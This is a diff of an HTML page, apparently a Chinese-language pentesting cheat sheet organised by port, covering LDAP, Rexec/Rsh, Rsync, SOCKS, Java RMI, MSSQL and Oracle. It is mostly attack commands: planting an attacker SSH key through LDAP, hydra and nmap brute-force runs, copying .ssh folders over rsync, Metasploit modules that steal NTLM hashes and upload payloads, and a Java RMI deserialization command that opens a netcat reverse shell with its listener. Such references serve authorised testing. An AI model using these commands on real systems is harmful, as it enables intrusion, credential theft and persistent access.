+&gt;&gt;&gt; connection.modify(&#39;uid&#x3D;USER,ou&#x3D;USERS,dc&#x3D;DOMAINM&#x3D;,dc&#x3D;DOMAIN&#39;,&#123;&#39;sshPublicKey&#39;: [(ldap3.MODIFY_REPLACE, [&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et&#x2F;B5bUyHkSANn2um9&#x2F;qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz&#x2F;EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o&#x2F;P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf&#x2F;l356r3dy&#x2F;oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH&#x2F;qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR&#x2F;WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF&#x2F;TnQ5N898RcKwll7mrvkbnGrknn+IT&#x2F;v3US19fPJWzl1&#x2F;pTqmAnkPThJW&#x2F;k&#x3D; badguy@evil&#39;])]&#125;)</code></pre>
+<h4 id="信息转储"><a href="#信息转储" class="headerlink" title="信息转储"></a>信息转储</h4><pre class="language-none"><code class="language-none">pip3 install ldapdomaindump 
+ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u &#39;&lt;domain&gt;\&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; [--authtype SIMPLE] --no-json --no-grep [-o &#x2F;path&#x2F;dir]</code></pre>
+<h4 id="暴力破解-3"><a href="#暴力破解-3" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">nmap --script ldap-brute -p 389 &lt;IP&gt;
 
-hydra -l &#123;Username&#125; -P &#123;Big_Passwordlist&#125; &#123;IP&#125; ldap2 -V -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="凭证攫取"><a href="#凭证攫取" class="headerlink" title="凭证攫取"></a>凭证攫取</h4><pre class="line-numbers language-none"><code class="language-none">1）检查空凭证或凭证是否有效
+hydra -l &#123;Username&#125; -P &#123;Big_Passwordlist&#125; &#123;IP&#125; ldap2 -V -f</code></pre>
+<h4 id="凭证攫取"><a href="#凭证攫取" class="headerlink" title="凭证攫取"></a>凭证攫取</h4><pre class="language-none"><code class="language-none">1）检查空凭证或凭证是否有效
 
 ldapsearch -x -h &lt;IP&gt; -D &#39;&#39; -w &#39;&#39; -b &quot;DC&#x3D;&lt;1_SUBDOMAIN&gt;,DC&#x3D;&lt;TDL&gt;&quot;
 ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC&#x3D;&lt;1_SUBDOMAIN&gt;,DC&#x3D;&lt;TDL&gt;&quot;
@@ -697,14 +697,14 @@ ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39
 ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN&#x3D;Administrators,CN&#x3D;Builtin,DC&#x3D;&lt;1_SUBDOMAIN&gt;,DC&#x3D;&lt;TDL&gt;&quot;
 
 提取远程桌面组
-ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN&#x3D;Remote Desktop Users,CN&#x3D;Builtin,DC&#x3D;&lt;1_SUBDOMAIN&gt;,DC&#x3D;&lt;TDL&gt;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ldapsearch -x -h &lt;IP&gt; -D &#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;CN&#x3D;Remote Desktop Users,CN&#x3D;Builtin,DC&#x3D;&lt;1_SUBDOMAIN&gt;,DC&#x3D;&lt;TDL&gt;&quot;</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/BeyondTrust/pbis-open/">https://github.com/BeyondTrust/pbis-open/</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/">https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-ldap">https://book.hacktricks.xyz/pentesting/pentesting-ldap</a></li>
 </ul>
-<h3 id="512-514-Rexec-x2F-Rlogin-x2F-Rsh"><a href="#512-514-Rexec-x2F-Rlogin-x2F-Rsh" class="headerlink" title="512-514: Rexec&#x2F;Rlogin&#x2F;Rsh"></a>512-514: Rexec&#x2F;Rlogin&#x2F;Rsh</h3><h4 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h4><pre class="line-numbers language-none"><code class="language-none">1) Rexec: 允许在主机内执行命令
+<h3 id="512-514-Rexec-x2F-Rlogin-x2F-Rsh"><a href="#512-514-Rexec-x2F-Rlogin-x2F-Rsh" class="headerlink" title="512-514: Rexec&#x2F;Rlogin&#x2F;Rsh"></a>512-514: Rexec&#x2F;Rlogin&#x2F;Rsh</h3><h4 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h4><pre class="language-none"><code class="language-none">1) Rexec: 允许在主机内执行命令
 
 PORT    STATE SERVICE
 512&#x2F;tcp open  exec
@@ -712,23 +712,23 @@ PORT    STATE SERVICE
 2) Rlogin&#x2F;Rsh: 旧版远程登录
 
 PORT    STATE SERVICE
-513&#x2F;tcp open  login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><pre class="line-numbers language-none"><code class="language-none">rlogin &lt;IP&gt; -l &lt;username&gt;
+513&#x2F;tcp open  login</code></pre>
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><pre class="language-none"><code class="language-none">rlogin &lt;IP&gt; -l &lt;username&gt;
 
 rsh &lt;IP&gt; &lt;Command&gt;
 rsh &lt;IP&gt; -l domain\user &lt;Command&gt;
 rsh domain&#x2F;user@&lt;IP&gt; &lt;Command&gt;
-rsh domain\\user@&lt;IP&gt; &lt;Command&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-4"><a href="#暴力破解-4" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec:&#x2F;&#x2F;&lt;Victim-IP&gt; -v -V
+rsh domain\\user@&lt;IP&gt; &lt;Command&gt;</code></pre>
+<h4 id="暴力破解-4"><a href="#暴力破解-4" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec:&#x2F;&#x2F;&lt;Victim-IP&gt; -v -V
 
 hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin:&#x2F;&#x2F;&lt;Victim-IP&gt; -v -V
 
-hydra -L &lt;Username_list&gt; rsh:&#x2F;&#x2F;&lt;Victim_IP&gt; -v -V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="873-Rsync"><a href="#873-Rsync" class="headerlink" title="873-Rsync"></a>873-Rsync</h3><h4 id="Banner抓取-3"><a href="#Banner抓取-3" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="line-numbers language-none"><code class="language-none">nc -vn &lt;IP&gt; 873<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="服务枚举-2"><a href="#服务枚举-2" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script &quot;rsync-list-modules&quot; -p &lt;PORT&gt; &lt;IP&gt;
-msf&gt; use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-5"><a href="#暴力破解-5" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script rsync-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 873 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="line-numbers language-none"><code class="language-none">1）列举分享模块
+hydra -L &lt;Username_list&gt; rsh:&#x2F;&#x2F;&lt;Victim_IP&gt; -v -V</code></pre>
+<h3 id="873-Rsync"><a href="#873-Rsync" class="headerlink" title="873-Rsync"></a>873-Rsync</h3><h4 id="Banner抓取-3"><a href="#Banner抓取-3" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="language-none"><code class="language-none">nc -vn &lt;IP&gt; 873</code></pre>
+<h4 id="服务枚举-2"><a href="#服务枚举-2" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap -sV --script &quot;rsync-list-modules&quot; -p &lt;PORT&gt; &lt;IP&gt;
+msf&gt; use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list</code></pre>
+<h4 id="暴力破解-5"><a href="#暴力破解-5" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">nmap -sV --script rsync-brute --script-args userdb&#x3D;&#x2F;var&#x2F;usernames.txt,passdb&#x3D;&#x2F;var&#x2F;passwords.txt -p 873 &lt;IP&gt;</code></pre>
+<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="language-none"><code class="language-none">1）列举分享模块
 
 rsync -av --list-only rsync:&#x2F;&#x2F;192.168.0.123&#x2F;shared_name
 
@@ -743,24 +743,24 @@ rsync -av home_user&#x2F;.ssh&#x2F; rsync:&#x2F;&#x2F;username@192.168.0.123&#x2
 
 4）寻找配置文件
 
-find &#x2F;etc \( -name rsyncd.conf -o -name rsyncd.secrets \)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="1080-Socks"><a href="#1080-Socks" class="headerlink" title="1080-Socks"></a>1080-Socks</h3><h4 id="认证检查"><a href="#认证检查" class="headerlink" title="认证检查"></a>认证检查</h4><pre class="line-numbers language-none"><code class="language-none">nmap -p 1080 &lt;ip&gt; --script socks-auth-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="暴力破解-6"><a href="#暴力破解-6" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script socks-brute -p 1080 &lt;ip&gt;
+find &#x2F;etc \( -name rsyncd.conf -o -name rsyncd.secrets \)</code></pre>
+<h3 id="1080-Socks"><a href="#1080-Socks" class="headerlink" title="1080-Socks"></a>1080-Socks</h3><h4 id="认证检查"><a href="#认证检查" class="headerlink" title="认证检查"></a>认证检查</h4><pre class="language-none"><code class="language-none">nmap -p 1080 &lt;ip&gt; --script socks-auth-info</code></pre>
+<h4 id="暴力破解-6"><a href="#暴力破解-6" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">nmap --script socks-brute -p 1080 &lt;ip&gt;
 
-nmap  --script socks-brute --script-args userdb&#x3D;users.txt,passdb&#x3D;rockyou.txt,unpwdb.timelimit&#x3D;30m -p 1080 &lt;ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><pre class="line-numbers language-none"><code class="language-none">vim &#x2F;etc&#x2F;proxychains4.conf
+nmap  --script socks-brute --script-args userdb&#x3D;users.txt,passdb&#x3D;rockyou.txt,unpwdb.timelimit&#x3D;30m -p 1080 &lt;ip&gt;</code></pre>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;proxychains4.conf
 socks5 10.10.10.10 1080
 
-socks5 10.10.10.10 1080 username password  #使用认证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+socks5 10.10.10.10 1080 username password  #使用认证</code></pre>
 <p>refer: <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/tunneling-and-port-forwarding">https://book.hacktricks.xyz/tunneling-and-port-forwarding</a></p>
-<h3 id="1098-1099-Java-RMI"><a href="#1098-1099-Java-RMI" class="headerlink" title="1098-1099: Java RMI"></a>1098-1099: Java RMI</h3><h4 id="服务指纹-1"><a href="#服务指纹-1" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">Default port: 1090,1098,1099,1199,4443-4446,8999-9010,9999
+<h3 id="1098-1099-Java-RMI"><a href="#1098-1099-Java-RMI" class="headerlink" title="1098-1099: Java RMI"></a>1098-1099: Java RMI</h3><h4 id="服务指纹-1"><a href="#服务指纹-1" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">Default port: 1090,1098,1099,1199,4443-4446,8999-9010,9999
 
 PORT      STATE SERVICE      VERSION
 1090&#x2F;tcp  open  ssl&#x2F;java-rmi Java RMI
 9010&#x2F;tcp  open  java-rmi     Java RMI
 37471&#x2F;tcp open  java-rmi     Java RMI
-40259&#x2F;tcp open  ssl&#x2F;java-rmi Java RMI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="line-numbers language-none"><code class="language-none">1）服务枚举
+40259&#x2F;tcp open  ssl&#x2F;java-rmi Java RMI</code></pre>
+<h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="language-none"><code class="language-none">1）服务枚举
 
 rmg enum &#123;IP&#125; &#123;PORT&#125;
 
@@ -772,7 +772,7 @@ rmg guess &#123;IP&#125; &#123;PORT&#125;
 
 rmg serial 172.17.0.2 9010 CommonsCollections6 &#39;nc 172.17.0.1 4444 -e ash&#39; --bound-name plain-server --signature &quot;String execute(String dummy)&quot;
 
-nc -vlp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+nc -vlp 4444</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></li>
@@ -781,13 +781,13 @@ nc -vlp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi">https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi</a></li>
 <li><a target="_blank" rel="noopener" href="https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/">https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a></li>
 </ul>
-<h3 id="1433-MSSQL"><a href="#1433-MSSQL" class="headerlink" title="1433-MSSQL"></a>1433-MSSQL</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port&#x3D;1433,mssql.username&#x3D;sa,mssql.password&#x3D;,mssql.instance-name&#x3D;MSSQLSERVER -sV -p 1433 &lt;IP&gt;
+<h3 id="1433-MSSQL"><a href="#1433-MSSQL" class="headerlink" title="1433-MSSQL"></a>1433-MSSQL</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre class="language-none"><code class="language-none">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port&#x3D;1433,mssql.username&#x3D;sa,mssql.password&#x3D;,mssql.instance-name&#x3D;MSSQLSERVER -sV -p 1433 &lt;IP&gt;
 msf&gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_ping
 
 searchsploit &quot;microsoft sql server&quot;
 nmap --script-help &quot;*ms* and *sql*&quot;
-msf&gt; search mssql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="Meatsploit"><a href="#Meatsploit" class="headerlink" title="Meatsploit"></a>Meatsploit</h4><pre class="line-numbers language-none"><code class="language-none">#Set USERNAME, RHOSTS and PASSWORD
+msf&gt; search mssql</code></pre>
+<h4 id="Meatsploit"><a href="#Meatsploit" class="headerlink" title="Meatsploit"></a>Meatsploit</h4><pre class="language-none"><code class="language-none">#Set USERNAME, RHOSTS and PASSWORD
 #Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used
 
 #Steal NTLM
@@ -815,26 +815,26 @@ msf&gt; use admin&#x2F;mssql&#x2F;mssql_exec #Execute commands
 msf&gt; use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payload #Uploads and execute a payload
 
 #Add new admin user from meterpreter session
-msf&gt; use windows&#x2F;manage&#x2F;mssql_local_auth_bypass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-7"><a href="#暴力破解-7" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">#Use the NetBIOS name of the machine as domain
+msf&gt; use windows&#x2F;manage&#x2F;mssql_local_auth_bypass</code></pre>
+<h4 id="暴力破解-7"><a href="#暴力破解-7" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">#Use the NetBIOS name of the machine as domain
 crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
 hydra -L &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt &lt;IP&gt; mssql
 medusa -h &lt;IP&gt; –U &#x2F;root&#x2F;Desktop&#x2F;user.txt –P &#x2F;root&#x2F;Desktop&#x2F;pass.txt –M mssql
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain&#x3D;DOMAIN,userdb&#x3D;customuser.txt,passdb&#x3D;custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; #Use domain if needed. Be carefull with the number of password in the list, this could block accounts
-msf&gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login #Be carefull, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+msf&gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login #Be carefull, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li>
 </ul>
-<h3 id="1521-1529-Oracle-TNS"><a href="#1521-1529-Oracle-TNS" class="headerlink" title="1521-1529: Oracle TNS"></a>1521-1529: Oracle TNS</h3><h4 id="服务指纹-2"><a href="#服务指纹-2" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">1521&#x2F;tcp open  oracle-tns    Oracle TNS Listener<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="版本枚举"><a href="#版本枚举" class="headerlink" title="版本枚举"></a>版本枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script &quot;oracle-tns-version&quot; -p 1521 -T4 -sV &lt;IP&gt;
+<h3 id="1521-1529-Oracle-TNS"><a href="#1521-1529-Oracle-TNS" class="headerlink" title="1521-1529: Oracle TNS"></a>1521-1529: Oracle TNS</h3><h4 id="服务指纹-2"><a href="#服务指纹-2" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">1521&#x2F;tcp open  oracle-tns    Oracle TNS Listener</code></pre>
+<h4 id="版本枚举"><a href="#版本枚举" class="headerlink" title="版本枚举"></a>版本枚举</h4><pre class="language-none"><code class="language-none">nmap --script &quot;oracle-tns-version&quot; -p 1521 -T4 -sV &lt;IP&gt;
 msf&gt; use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnslsnr_version
 
 #apt install tnscmd10g
 tnscmd10g version -p 1521 -h &lt;IP&gt;
 
-hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="SID枚举"><a href="#SID枚举" class="headerlink" title="SID枚举"></a>SID枚举</h4><pre class="line-numbers language-none"><code class="language-none">tnscmd10g status-p 1521 -h &lt;IP&gt; #The SID are inside: SERVICE&#x3D;(SERVICE_NAME&#x3D;&lt;SID_NAME&gt;)
+hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener</code></pre>
+<h4 id="SID枚举"><a href="#SID枚举" class="headerlink" title="SID枚举"></a>SID枚举</h4><pre class="language-none"><code class="language-none">tnscmd10g status-p 1521 -h &lt;IP&gt; #The SID are inside: SERVICE&#x3D;(SERVICE_NAME&#x3D;&lt;SID_NAME&gt;)
 
 #msf1
 msf&gt; use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;sid_enum
@@ -844,13 +844,13 @@ msf&gt; run
 msf&gt; use auxiliary&#x2F;admin&#x2F;oracle&#x2F;tnscmd
 msf&gt; set CMD (CONNECT_DATA&#x3D;(COMMAND&#x3D;STATUS))
 msf&gt; set rhost &lt;IP&gt;
-msf&gt; run #The SID are inside: SERVICE&#x3D;(SERVICE_NAME&#x3D;&lt;SID_NAME&gt;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="SID爆破"><a href="#SID爆破" class="headerlink" title="SID爆破"></a>SID爆破</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;sid.txt -s 1521 &lt;IP&gt; oracle-sid
+msf&gt; run #The SID are inside: SERVICE&#x3D;(SERVICE_NAME&#x3D;&lt;SID_NAME&gt;)</code></pre>
+<h4 id="SID爆破"><a href="#SID爆破" class="headerlink" title="SID爆破"></a>SID爆破</h4><pre class="language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;sid.txt -s 1521 &lt;IP&gt; oracle-sid
 patator oracle_login host&#x3D;&lt;IP&gt; sid&#x3D;FILE0 0&#x3D;sids-oracle.txt -x ignore:code&#x3D;ORA-12505
 .&#x2F;odat.py sidguesser -s $SERVER -d $SID --sids-file&#x3D;.&#x2F;sids.txt
 msf&gt; use auxiliary&#x2F;admin&#x2F;oracle&#x2F;sid_brute #This will use the list located at &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;sid.txt
-nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nselib&#x2F;data&#x2F;oracle-sids<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-8"><a href="#暴力破解-8" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">patator oracle_login sid&#x3D;&lt;SID&gt; host&#x3D;&lt;IP&gt; user&#x3D;FILE0 password&#x3D;FILE1 0&#x3D;users-oracle.txt 1&#x3D;pass-oracle.txt -x ignore:code&#x3D;ORA-01017
+nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;nselib&#x2F;data&#x2F;oracle-sids</code></pre>
+<h4 id="暴力破解-8"><a href="#暴力破解-8" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">patator oracle_login sid&#x3D;&lt;SID&gt; host&#x3D;&lt;IP&gt; user&#x3D;FILE0 password&#x3D;FILE1 0&#x3D;users-oracle.txt 1&#x3D;pass-oracle.txt -x ignore:code&#x3D;ORA-01017
 
 .&#x2F;odat.py passwordguesser -s $SERVER -d $SID
 .&#x2F;odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
@@ -868,14 +868,14 @@ msf&gt; set RPORTS 1521
 msf&gt; set SID &lt;SID&gt;
 
 #nmap fails sometimes for some reson executing this script
-nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid&#x3D;&lt;SID&gt; &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="登录连接"><a href="#登录连接" class="headerlink" title="登录连接"></a>登录连接</h4><pre class="line-numbers language-none"><code class="language-none">sqlplus &lt;username&gt;&#x2F;&lt;password&gt;@&lt;ip_address&gt;&#x2F;&lt;SID&gt;;
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid&#x3D;&lt;SID&gt; &lt;IP&gt;</code></pre>
+<h4 id="登录连接"><a href="#登录连接" class="headerlink" title="登录连接"></a>登录连接</h4><pre class="language-none"><code class="language-none">sqlplus &lt;username&gt;&#x2F;&lt;password&gt;@&lt;ip_address&gt;&#x2F;&lt;SID&gt;;
 
 sqlplus &lt;username&gt;&#x2F;&lt;password&gt;@&lt;ip_address&gt;:&lt;port&gt;&#x2F;&lt;SID&gt;;       #非标准端口
 
 sqlplus &lt;username&gt;&#x2F;&lt;password&gt;@&lt;ip_address&gt;&#x2F;&lt;SID&gt; &#39;as sysdba&#39;;  #高权限账户
-#Example: sqlplus SYSTEM&#x2F;MANAGER@192.168.0.2&#x2F;ORCL &#39;as sysdba&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="自动扫描"><a href="#自动扫描" class="headerlink" title="自动扫描"></a>自动扫描</h4><pre class="line-numbers language-none"><code class="language-none">1）oscanner
+#Example: sqlplus SYSTEM&#x2F;MANAGER@192.168.0.2&#x2F;ORCL &#39;as sysdba&#39;</code></pre>
+<h4 id="自动扫描"><a href="#自动扫描" class="headerlink" title="自动扫描"></a>自动扫描</h4><pre class="language-none"><code class="language-none">1）oscanner
 #apt install oscanner
 oscanner -s &lt;IP&gt; -P &lt;PORT&gt;
 
@@ -884,8 +884,8 @@ git clone https:&#x2F;&#x2F;github.com&#x2F;quentinhardy&#x2F;odat.git
 cd odat
 .&#x2F;odat.py --help
 .&#x2F;odat.py all -s &lt;IP&gt; -p &lt;PORT&gt;
-.&#x2F;odat.py all -s &lt;IP&gt; -p &lt;PORT&gt; -d &lt;SID&gt; #To bruteforce accounts for that SID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><pre class="line-numbers language-none"><code class="language-none">安装ODAT
+.&#x2F;odat.py all -s &lt;IP&gt; -p &lt;PORT&gt; -d &lt;SID&gt; #To bruteforce accounts for that SID</code></pre>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><pre class="language-none"><code class="language-none">安装ODAT
 
 git clone https:&#x2F;&#x2F;github.com&#x2F;quentinhardy&#x2F;odat.git
 cd odat
@@ -898,27 +898,27 @@ cd odat
